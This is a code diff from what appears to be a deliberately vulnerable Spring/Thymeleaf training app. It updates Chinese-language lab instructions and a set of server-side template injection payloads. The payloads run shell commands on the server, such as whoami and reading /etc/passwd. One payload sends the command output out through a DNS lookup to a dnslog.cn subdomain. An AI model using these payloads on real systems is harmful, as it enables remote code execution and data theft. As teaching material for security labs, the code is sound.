@@ -219,9 +219,10 @@ public String secModel(@RequestParam(defaultValue = "zh") String lang, Model mod
         <div style="text-align: left; font-size: 13px; color: #606266; line-height: 2;">
           1. 访问 <a href="http://dnslog.cn" target="_blank" style="color: #409EFF;">dnslog.cn</a>，点击 "Get SubDomain" 获取一个专属子域名（如 <code>abc123.dnslog.cn</code>）<br>
           2. 选择上方的 "📡 OOB 外带" payload，在文本框中将 <code>你的子域名.dnslog.cn</code> 替换为你获取的子域名<br>
-          3. 点击 "触发漏洞接口"，页面会返回 500 报错（因为 Process 对象不是有效模板名），但命令已在服务端执行<br>
-          4. 回到 dnslog.cn 页面，点击 "Refresh Record"，即可看到类似 <code>liujianping.abc123.dnslog.cn</code> 的 DNS 查询记录<br>
-          5. 子域名前缀（如 <code>liujianping</code>）就是 <code>whoami</code> 命令的执行结果
+          3. 点击 "触发漏洞接口"，页面会返回 500 报错（正常现象），但 DNS 查询已在服务端发出<br>
+          4. 回到 dnslog.cn 页面，点击 "Refresh Record"，即可看到类似 <code>用户名.abc123.dnslog.cn</code> 的 DNS 查询记录<br>
+          5. 子域名前缀就是服务端 <code>whoami</code> 命令的执行结果<br>
+          6. <strong>原理</strong>：payload 先执行 <code>whoami</code> 读取输出，再用 Java 原生 <code>InetAddress.getByName()</code> 发起 DNS 查询，无需依赖 ping/curl 等系统命令，Docker 容器中也能使用
         </div>
       </div>
     </el-dialog>
@@ -314,7 +315,7 @@ const PAYLOADS = {
   rce_whoami: `__\${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'/bin/sh','-c','whoami'}).getInputStream()).useDelimiter('\\\\A').next()}__::.x`,
   rce_passwd: `__\${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'/bin/sh','-c','head -5 /etc/passwd | tr \"\\n\" \"|\"'}).getInputStream()).useDelimiter('\\\\A').next()}__::.x`,
   blind_touch: "__${T(java.lang.Runtime).getRuntime().exec('touch /tmp/ssti_pwned')}__::.x",
-  oob_dnslog: `__\${T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'/bin/sh','-c','ping -c 1 $(whoami).你的子域名.dnslog.cn'})}__::.x`
+  oob_dnslog: `__\${T(java.net.InetAddress).getByName(new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'/bin/sh','-c','whoami'}).getInputStream()).useDelimiter('\\\\A').next().trim().concat('.你的子域名.dnslog.cn'))}__::.x`
 }
 
 const emptyForm = () => ({ selectedPayload: '', lang: '', requestUrl: '', html: '' })
